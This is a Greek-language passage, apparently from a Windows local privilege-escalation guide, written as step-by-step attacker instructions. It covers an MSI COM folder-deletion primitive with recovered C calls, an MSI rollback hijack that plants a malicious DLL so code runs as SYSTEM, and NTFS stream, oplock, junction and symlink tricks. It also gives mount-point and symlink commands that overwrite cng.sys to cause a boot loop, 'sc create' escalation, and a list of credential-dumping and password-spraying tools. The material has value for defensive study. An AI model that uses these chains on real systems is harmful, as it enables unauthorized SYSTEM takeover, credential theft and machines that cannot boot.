Ένας client με χαμηλά προνόμια μπορεί να φτάσει στην υπηρεσία `msiexec.exe` του SYSTEM μέσω του αντικειμένου COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Η αντίστροφη μηχανική εντόπισε τις σχετικές κλήσεις `IMsiServer` ως `MsiBeginTransactionW` στο vtable offset `0xA0`, `SetEEUIDirectoryAndFilter` στο `0xC8` και `CleanupTempPackages` στο `0x50`. Αυτά τα ονόματα και offsets προέκυψαν από αντίστροφη μηχανική και ενδέχεται να διαφέρουν μεταξύ builds.<sup>[[41]](#references)</sup>

Για έναν μη διαχειριστή, το `SetEEUIDirectoryAndFilter` κάνει impersonation του caller μόνο κατά το άνοιγμα της παρεχόμενης διαδρομής με `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` και `FILE_FLAG_OPEN_REPARSE_POINT`. Αυτό αποδεικνύει ότι ο caller μπορεί να διαγράψει τον κατάλογο και αποφεύγει την ακολούθηση ενός reparse point, αλλά **δεν** συνδέει το ελεγμένο αντικείμενο αρχείου με το μεταγενέστερο cleanup ούτε αποδεικνύει ότι το δημιούργησε το Windows Installer.<sup>[[41]](#references)</sup>

Μετά το `MsiBeginTransactionW`, το `SetEEUIDirectoryAndFilter` προγραμματίζει τη διαδρομή ως φάκελο, ανεξάρτητα από το όρισμα filter του caller. Η υπηρεσία γράφει μια επώνυμη τιμή `REG_DWORD` κάτω από το `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: το όνομα της τιμής είναι η διαδρομή που ελέγχει ο caller και τα δεδομένα `0x00000002` είναι η σημαία φακέλου. Στη συνέχεια, το `CleanupTempPackages(NULL, FALSE)` εισέρχεται απευθείας στο cleanup. Το αναβαθμισμένο worker απαριθμεί τις τιμές μητρώου και περνά τις εγγραφές φακέλων στην αναδρομική `FDeleteFolder`, χωρίς να ελέγχει την προέλευση της διαδρομής. Αν η κανονική αφαίρεση αποτύχει, ο κώδικας καλεί επίσης τη `LockdownPath`, διαγράφει τα attributes του αρχείου και επαναλαμβάνει την προσπάθεια.<sup>[[41]](#references)</sup>

Η ελάχιστη ακολουθία κλήσεων που ανακτήθηκε από το `msi.dll` είναι:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Το χρήσιμο primitive είναι η επαναχρησιμοποίηση διαδρομής και όχι η ανακατεύθυνση μέσω junction. Καταχωρίστε ένα `C:\Config.Msi` που δημιουργήθηκε από τον επιτιθέμενο, αφαιρέστε το και αφήστε το Windows Installer να δημιουργήσει αργότερα ξανά την ίδια διαδρομή με προστατευμένα δεδομένα rollback. Η διαδικασία εκκαθάρισης εμπιστεύεται το παλιό όνομα `TempPackages` και διαγράφει τον νέο κατάλογο ως SYSTEM. Αυτό παρακάμπτει το προβλεπόμενο όριο ασφαλείας που παρέχουν το `FILE_FLAG_OPEN_REPARSE_POINT` και ο μετριασμός εμπιστοσύνης ανακατεύθυνσης, επειδή δεν απαιτείται reparse point.<sup>[[41]](#references)</sup>

Αυτό το primitive διαγραφής εντάσσεται στην αλυσίδα rollback που ακολουθεί: διατηρήστε την ξεχωριστή εγγραφή `Installer\Folders`, διαγράψτε το προστατευμένο `C:\Config.Msi`, δημιουργήστε το ξανά με NULL DACL και κρατήστε ένα handle με δικαίωμα `WRITE_DAC` προτού το installer ασφαλίσει το DACL. Το handle που έχει ανοιχτεί εκ των προτέρων μπορεί να επαναφέρει ένα επιτρεπτικό DACL με το `NtSetSecurityObject`, και μετά το παραγόμενο `.rbs` μπορεί να αντικατασταθεί προτού συνεχιστεί το rollback.<sup>[[41]](#references)</sup>

Η Microsoft διόρθωσε το πρόβλημα στη διαδρομή, εμποδίζοντας την `CMsiTransaction::SetEEUIDirectoryAndFilter` να καλέσει την `ScheduleFileOrFolderDelete` όταν είναι ενεργοποιημένη η νέα feature gate. Η κλήση COM μπορεί και πάλι να επιστρέψει επιτυχία, αλλά δεν προσθέτει πλέον τη διαδρομή που ελέγχει ο επιτιθέμενος στο `TempPackages`. Εγκαταστήστε τις ενημερώσεις ασφαλείας των Windows του Απριλίου 2025, αντί να χρησιμοποιείτε την επιτυχή επιστροφή της μεθόδου ως έλεγχο για το αν εφαρμόστηκε η επιδιόρθωση.<sup>[[41]](#references)[[42]](#references)</sup>

Η τεχνική συνοψίζεται ως εξής:

1. **Στάδιο 1 – Προετοιμασία για το Hijack (αφήστε το `C:\Config.Msi` κενό)**

- Βήμα 1: Εγκαταστήστε το MSI
    - Δημιουργήστε ένα `.msi` που εγκαθιστά ένα ακίνδυνο αρχείο (π.χ. `dummy.txt`) σε έναν εγγράψιμο φάκελο (`TARGETDIR`).
    - Δηλώστε το installer ως **"UAC Compliant"**, ώστε να μπορεί να το εκτελέσει ένας **μη-admin χρήστης**.
    - Κρατήστε ένα **handle** ανοιχτό στο αρχείο μετά την εγκατάσταση.

- Βήμα 2: Ξεκινήστε την απεγκατάσταση
    - Απεγκαταστήστε το ίδιο `.msi`.
    - Η διαδικασία απεγκατάστασης αρχίζει να μετακινεί αρχεία στο `C:\Config.Msi` και να τα μετονομάζει σε αρχεία `.rbf` (αντίγραφα ασφαλείας rollback).
    - **Παρακολουθήστε το ανοιχτό file handle** με το `GetFinalPathNameByHandle` για να εντοπίσετε πότε το αρχείο γίνεται `C:\Config.Msi\<random>.rbf`.

- Βήμα 3: Προσαρμοσμένος συγχρονισμός
    - Το `.msi` περιλαμβάνει ένα **custom uninstall action (`SyncOnRbfWritten`)** που:
        - Σηματοδοτεί ότι έχει γραφτεί το `.rbf`.
        - Έπειτα **περιμένει** ένα άλλο event πριν συνεχίσει την απεγκατάσταση.

- Βήμα 4: Αποκλείστε τη διαγραφή του `.rbf`
    - Όταν λάβετε το σήμα, **ανοίξτε το αρχείο `.rbf`** χωρίς `FILE_SHARE_DELETE` — αυτό **εμποδίζει τη διαγραφή του**.
    - Έπειτα **στείλτε σήμα πίσω**, ώστε να ολοκληρωθεί η απεγκατάσταση.
    - Το Windows Installer αποτυγχάνει να διαγράψει το `.rbf` και, επειδή δεν μπορεί να διαγράψει όλα τα περιεχόμενα, **το `C:\Config.Msi` δεν αφαιρείται**.

- Βήμα 5: Διαγράψτε χειροκίνητα το `.rbf`
    - Εσείς (ο επιτιθέμενος) διαγράφετε χειροκίνητα το αρχείο `.rbf`.
    - Τώρα το **`C:\Config.Msi` είναι κενό**, έτοιμο για hijack.

> Σε αυτό το σημείο, **ενεργοποιήστε την ευπάθεια διαγραφής αυθαίρετου φακέλου σε επίπεδο SYSTEM** για να διαγράψετε το `C:\Config.Msi`.

2. **Στάδιο 2 – Αντικατάσταση των rollback scripts με κακόβουλα**

- Βήμα 6: Δημιουργήστε ξανά το `C:\Config.Msi` με αδύναμα ACL
    - Δημιουργήστε ξανά τον φάκελο `C:\Config.Msi`.
    - Ορίστε **αδύναμα DACL** (π.χ. Everyone:F) και **κρατήστε ένα handle ανοιχτό** με `WRITE_DAC`.

- Βήμα 7: Εκτελέστε άλλη εγκατάσταση
    - Εγκαταστήστε ξανά το `.msi`, με:
        - `TARGETDIR`: Εγγράψιμη τοποθεσία.
        - `ERROROUT`: Μια μεταβλητή που προκαλεί υποχρεωτική αποτυχία.
    - Αυτή η εγκατάσταση θα χρησιμοποιηθεί για να ενεργοποιήσει ξανά το **rollback**, το οποίο διαβάζει τα `.rbs` και `.rbf`.

- Βήμα 8: Παρακολουθήστε για `.rbs`
    - Χρησιμοποιήστε το `ReadDirectoryChangesW` για να παρακολουθείτε το `C:\Config.Msi` μέχρι να εμφανιστεί ένα νέο `.rbs`.
    - Καταγράψτε το όνομα αρχείου.

- Βήμα 9: Συγχρονιστείτε πριν από το rollback
    - Το `.msi` περιέχει ένα **custom install action (`SyncBeforeRollback`)** που:
        - Σηματοδοτεί ένα event όταν δημιουργηθεί το `.rbs`.
        - Έπειτα **περιμένει** πριν συνεχίσει.

- Βήμα 10: Εφαρμόστε ξανά τα αδύναμα ACL
    - Αφού λάβετε το event `.rbs created`:
        - Το Windows Installer **εφαρμόζει ξανά ισχυρά ACL** στο `C:\Config.Msi`.
        - Όμως, επειδή εξακολουθείτε να έχετε handle με `WRITE_DAC`, μπορείτε να **εφαρμόσετε ξανά αδύναμα ACL**.

> Τα ACL **επιβάλλονται μόνο όταν ανοίγεται ένα handle**, επομένως μπορείτε ακόμη να γράψετε στον φάκελο.

- Βήμα 11: Τοποθετήστε πλαστά `.rbs` και `.rbf`
    - Αντικαταστήστε το αρχείο `.rbs` με ένα **πλαστό rollback script** που δίνει εντολή στα Windows να:
        - Επαναφέρουν το αρχείο `.rbf` σας (κακόβουλο DLL) σε μια **προνομιούχα τοποθεσία** (π.χ. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Τοποθετήστε το πλαστό `.rbf` που περιέχει ένα **κακόβουλο payload DLL επιπέδου SYSTEM**.

- Βήμα 12: Ενεργοποιήστε το rollback
    - Στείλτε σήμα στο event συγχρονισμού, ώστε να συνεχίσει το installer.
    - Ένα **custom action τύπου 19 (`ErrorOut`)** έχει ρυθμιστεί ώστε να **αποτυγχάνει σκόπιμα την εγκατάσταση** σε γνωστό σημείο.
    - Αυτό προκαλεί την έναρξη του **rollback**.

- Βήμα 13: Το SYSTEM εγκαθιστά το DLL σας
    - Το Windows Installer:
        - Διαβάζει το κακόβουλο `.rbs` σας.
        - Αντιγράφει το DLL `.rbf` σας στη θέση-στόχο.
    - Τώρα έχετε το **κακόβουλο DLL σας σε μια διαδρομή από την οποία φορτώνεται από το SYSTEM**.

- Τελικό βήμα: Εκτελέστε κώδικα ως SYSTEM
    - Εκτελέστε ένα έμπιστο **auto-elevated binary** (π.χ. `osk.exe`) που φορτώνει το DLL που κάνατε hijack.
    - **Μπουμ**: Ο κώδικάς σας εκτελείται **ως SYSTEM**.


### Από αυθαίρετη διαγραφή/μετακίνηση/μετονομασία αρχείων σε SYSTEM EoP

Η κύρια τεχνική MSI rollback (η προηγούμενη) προϋποθέτει ότι μπορείτε να διαγράψετε **ολόκληρο φάκελο** (π.χ. `C:\Config.Msi`). Τι γίνεται όμως αν η ευπάθειά σας επιτρέπει μόνο **διαγραφή αυθαίρετων αρχείων**;

Θα μπορούσατε να εκμεταλλευτείτε **εσωτερικές λειτουργίες του NTFS**: κάθε φάκελος έχει ένα κρυφό alternate data stream που ονομάζεται:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Αυτή η ροή αποθηκεύει τα **μεταδεδομένα ευρετηρίου** του φακέλου.

Έτσι, αν **διαγράψετε τη ροή `::$INDEX_ALLOCATION`** ενός φακέλου, το NTFS **αφαιρεί ολόκληρο τον φάκελο** από το σύστημα αρχείων.

Μπορείτε να το κάνετε αυτό χρησιμοποιώντας τυπικά API διαγραφής αρχείων, όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Παρόλο που καλείτε ένα API διαγραφής *αρχείων*, **διαγράφει τον ίδιο τον φάκελο**.

### Από τη διαγραφή περιεχομένων φακέλου σε EoP σε SYSTEM
Τι γίνεται αν το primitive σας δεν επιτρέπει τη διαγραφή αυθαίρετων αρχείων/φακέλων, αλλά **επιτρέπει τη διαγραφή των *περιεχομένων* ενός φακέλου που ελέγχεται από attacker**;

1. Βήμα 1: Ρυθμίστε έναν φάκελο-δόλωμα και ένα αρχείο
- Δημιουργήστε: `C:\temp\folder1`
- Μέσα σε αυτόν: `C:\temp\folder1\file1.txt`

2. Βήμα 2: Τοποθετήστε ένα **oplock** στο `file1.txt`
- Το **oplock** **παύει την εκτέλεση** όταν μια προνομιούχος διεργασία προσπαθεί να διαγράψει το `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Βήμα 3: Ενεργοποιήστε τη διεργασία SYSTEM (π.χ., `SilentCleanup`)
- Αυτή η διεργασία σαρώνει φακέλους (π.χ., `%TEMP%`) και προσπαθεί να διαγράψει τα περιεχόμενά τους.
- Όταν φτάσει στο `file1.txt`, **ενεργοποιείται το oplock** και παραδίδει τον έλεγχο στο callback σας.

4. Βήμα 4: Μέσα στο callback του oplock – ανακατευθύνετε τη διαγραφή

- Επιλογή A: Μετακινήστε το `file1.txt` αλλού
    - Έτσι αδειάζει το `folder1` χωρίς να διακοπεί το oplock.
    - Μην διαγράψετε απευθείας το `file1.txt` — αυτό θα απελευθέρωνε πρόωρα το oplock.

- Επιλογή B: Μετατρέψτε το `folder1` σε **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Επιλογή C: Δημιουργήστε ένα **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Αυτό στοχεύει το εσωτερικό stream του NTFS που αποθηκεύει τα μεταδεδομένα του φακέλου — η διαγραφή του διαγράφει τον φάκελο.

5. Βήμα 5: Απελευθέρωση του oplock
- Η διεργασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει το `file1.txt`.
- Όμως τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Αποτέλεσμα**: Το `C:\Config.Msi` διαγράφεται από το SYSTEM.

### Από τη δημιουργία φακέλου σε αυθαίρετη τοποθεσία σε μόνιμο DoS

Εκμεταλλευτείτε ένα primitive που σας επιτρέπει να **δημιουργήσετε έναν αυθαίρετο φάκελο ως SYSTEM/admin** — ακόμα κι αν **δεν μπορείτε να γράψετε αρχεία** ή **να ορίσετε αδύναμα δικαιώματα**.

Δημιουργήστε έναν **φάκελο** (όχι αρχείο) με το όνομα ενός **κρίσιμου driver των Windows**, π.χ.:
```
C:\Windows\System32\cng.sys
```

- Αυτή η διαδρομή συνήθως αντιστοιχεί στο kernel-mode driver `cng.sys`.
- Αν **το δημιουργήσετε εκ των προτέρων ως φάκελο**, τα Windows δεν μπορούν να φορτώσουν τον πραγματικό driver κατά την εκκίνηση.
- Έπειτα, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά την εκκίνηση.
- Βλέπουν τον φάκελο, **δεν μπορούν να εντοπίσουν τον πραγματικό driver** και **καταρρέουν ή διακόπτουν την εκκίνηση**.
- Δεν υπάρχει **εναλλακτική λύση** ούτε **ανάκτηση** χωρίς εξωτερική παρέμβαση (π.χ. επιδιόρθωση εκκίνησης ή πρόσβαση στον δίσκο).

### Από προνομιακές διαδρομές αρχείων καταγραφής/αντιγράφων ασφαλείας και OM symlinks σε αυθαίρετη αντικατάσταση αρχείων / boot DoS

Όταν μια **προνομιακή υπηρεσία** γράφει αρχεία καταγραφής/εξαγωγές σε μια διαδρομή που διαβάζεται από **εγγράψιμο config**, ανακατευθύνετε αυτήν τη διαδρομή με **Object Manager symlinks + NTFS mount points**, ώστε να μετατρέψετε την προνομιακή εγγραφή σε αυθαίρετη αντικατάσταση αρχείων (ακόμη και **χωρίς** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Απαιτήσεις**
- Το config που αποθηκεύει τη διαδρομή-στόχο είναι εγγράψιμο από τον attacker (π.χ. `%ProgramData%\...\.ini`).
- Δυνατότητα δημιουργίας mount point προς το `\RPC Control` και OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Μια προνομιακή λειτουργία που γράφει σε αυτήν τη διαδρομή (αρχείο καταγραφής, εξαγωγή, αναφορά).

**Παράδειγμα αλυσίδας**
1. Διαβάστε το config για να εντοπίσετε τον προορισμό του προνομιακού αρχείου καταγραφής, π.χ. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` στο `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Ανακατευθύνετε τη διαδρομή χωρίς δικαιώματα admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Περιμένετε να γράψει το log το προνομιούχο component (π.χ. ο admin επιλέγει «send test SMS»). Η εγγραφή καταλήγει πλέον στο `C:\Windows\System32\cng.sys`.
4. Εξετάστε τον overwritten στόχο (hex/PE parser) για να επιβεβαιώσετε την αλλοίωση· η επανεκκίνηση αναγκάζει τα Windows να φορτώσουν την παραποιημένη διαδρομή του driver → **boot loop DoS**. Αυτό ισχύει γενικά και για κάθε προστατευμένο αρχείο που θα ανοίξει για εγγραφή μια προνομιούχα υπηρεσία.

> Το `cng.sys` φορτώνεται κανονικά από το `C:\Windows\System32\drivers\cng.sys`, αλλά αν υπάρχει αντίγραφό του στο `C:\Windows\System32\cng.sys`, μπορεί να δοκιμαστεί πρώτα, καθιστώντας το αξιόπιστο DoS sink για αλλοιωμένα δεδομένα.



## **Από High Integrity σε System**

### **Νέα υπηρεσία**

Αν εκτελείτε ήδη διεργασία με High Integrity, η **διαδρομή προς το SYSTEM** μπορεί να είναι εύκολη: απλώς **δημιουργήστε και εκτελέστε μια νέα υπηρεσία**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Κατά τη δημιουργία ενός service binary, βεβαιωθείτε ότι είναι έγκυρο service ή ότι το binary εκτελεί γρήγορα τις απαραίτητες ενέργειες, καθώς θα τερματιστεί σε 20s αν δεν είναι έγκυρο service.

### AlwaysInstallElevated

Από μια διεργασία High Integrity, μπορείτε να δοκιμάσετε να **ενεργοποιήσετε τις καταχωρίσεις μητρώου AlwaysInstallElevated** και να **εγκαταστήσετε** ένα reverse shell χρησιμοποιώντας ένα wrapper _**.msi**_.\
[Περισσότερες πληροφορίες σχετικά με τα κλειδιά μητρώου που εμπλέκονται και τον τρόπο εγκατάστασης ενός πακέτου _.msi_ εδώ.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Μπορείτε να** [**βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Αν έχετε αυτά τα token privileges (πιθανότατα θα τα βρείτε σε μια διεργασία High Integrity), θα μπορείτε να **ανοίξετε σχεδόν οποιαδήποτε διεργασία** (εκτός από προστατευμένες διεργασίες) με το SeDebug privilege, να **αντιγράψετε το token** της διεργασίας και να δημιουργήσετε μια **αυθαίρετη διεργασία με αυτό το token**.\
Με αυτή την τεχνική συνήθως **επιλέγεται οποιαδήποτε διεργασία εκτελείται ως SYSTEM με όλα τα token privileges** (_ναι, μπορείτε να βρείτε διεργασίες SYSTEM χωρίς όλα τα token privileges_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για privilege escalation στο `getsystem`. Η τεχνική συνίσταται στη **δημιουργία ενός pipe και έπειτα στη δημιουργία/κατάχρηση ενός service ώστε να γράφει σε αυτό το pipe**. Στη συνέχεια, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το privilege **`SeImpersonate`** θα μπορεί να **προσποιηθεί το token** του client του pipe (του service), αποκτώντας SYSTEM privileges.\
Αν θέλετε να [**μάθετε περισσότερα για τα named pipes, διαβάστε αυτό**](#named-pipe-client-impersonation).\
Αν θέλετε να διαβάσετε ένα παράδειγμα για το [**πώς να μεταβείτε από High Integrity σε System χρησιμοποιώντας named pipes, διαβάστε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Αν καταφέρετε να **κάνετε hijack ένα dll** που **φορτώνεται** από μια **διεργασία** η οποία εκτελείται ως **SYSTEM**, θα μπορείτε να εκτελέσετε αυθαίρετο κώδικα με αυτά τα permissions. Επομένως, το Dll Hijacking είναι επίσης χρήσιμο για αυτό το είδος privilege escalation και, επιπλέον, είναι πολύ **ευκολότερο να επιτευχθεί από μια διεργασία High Integrity**, καθώς αυτή θα έχει **δικαιώματα εγγραφής** στους φακέλους που χρησιμοποιούνται για τη φόρτωση dlls.\
**Μπορείτε να** [**μάθετε περισσότερα για το Dll hijacking εδώ**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Διαβάστε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Καλύτερο εργαλείο για την αναζήτηση vectors για Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Ελέγχει για misconfigurations και ευαίσθητα αρχεία (**[**δείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Εντοπίζεται.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Ελέγχει για πιθανά misconfigurations και συλλέγει πληροφορίες (**[**δείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Ελέγχει για misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει αποθηκευμένες πληροφορίες συνεδριών PuTTY, WinSCP, SuperPuTTY, FileZilla και RDP. Χρησιμοποιήστε το -Thorough τοπικά.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει credentials από το Credential Manager. Εντοπίζεται.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Κάνει spray των συλλεγμένων passwords σε όλο το domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Το Inveigh είναι εργαλείο PowerShell για ADIDNS/LLMNR/mDNS spoofing και man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Βασικό privesc enumeration για Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Αναζητά γνωστά privesc vulnerabilities (DEPRECATED, αντικαταστάθηκε από το Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Τοπικοί έλεγχοι **(Απαιτούν δικαιώματα Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζητά γνωστά privesc vulnerabilities (πρέπει να γίνει compile με VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Κάνει enumerate το host αναζητώντας misconfigurations (περισσότερο εργαλείο συλλογής πληροφοριών παρά privesc) (πρέπει να γίνει compile) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει credentials από πολλά software (precompiled exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Ελέγχει για misconfiguration (precompiled executable στο github). Δεν συνιστάται. Δεν λειτουργεί καλά στο Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Ελέγχει για πιθανά misconfigurations (exe από python). Δεν συνιστάται. Δεν λειτουργεί καλά στο Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Εργαλείο που δημιουργήθηκε με βάση αυτή την ανάρτηση (δεν χρειάζεται accesschk για να λειτουργήσει σωστά, αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει exploits που λειτουργούν (τοπικό python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει exploits που λειτουργούν (τοπικό Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να κάνετε compile το project χρησιμοποιώντας τη σωστή έκδοση του .NET ([δείτε αυτό](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δείτε την εγκατεστημένη έκδοση του .NET στο host του θύματος, μπορείτε να εκτελέσετε:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Βασικές αρχές κλιμάκωσης προνομίων στα Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Κλιμάκωση προνομίων μέσω εκμετάλλευσης ανεπαρκών δικαιωμάτων φακέλων](http://www.greyhathacker.net/?p=738)
- [3] [Κλιμάκωση προνομίων στα Windows - ένα cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Εργαστήριο τοπικής κλιμάκωσης προνομίων σε Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Επιθέσεις στα Windows: Το AT είναι το νέο μαύρο (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Κλιμάκωση προνομίων - Windows - Πλήρης οδηγός OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Κλιμάκωση προνομίων - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Οδηγός κλιμάκωσης προνομίων στα Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Λίστα ελέγχου κλιμάκωσης προνομίων στα Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Κλιμάκωση προνομίων στα Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Μέθοδοι κλιμάκωσης προνομίων στα Windows για pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Phishing μέσω μακροεντολής Word VBA μέσω SMTP → αποκρυπτογράφηση διαπιστευτηρίων hMailServer → Veeam CVE-2023-27532 έως SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak από format string + stack BOF → VirtualAlloc ROP (RCE) και κλοπή kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Κυνηγώντας την Silver Fox: γάτα και ποντίκι στις σκιές του kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ευπάθεια προνομιακού συστήματος αρχείων σε σύστημα SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Εργαλεία ελέγχου συμβολικών συνδέσμων – χρήση του CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Επιστροφή στο παρελθόν: Κατάχρηση συμβολικών συνδέσμων στα Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (μεταφορά του Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Επικίνδυνη επίλυση μονάδων στα Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Μονάδες Node.js: φόρτωση από φακέλους `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Προκλήσεις λίστας ελέγχου C/C++, λυμένες](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Συνάρτηση RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
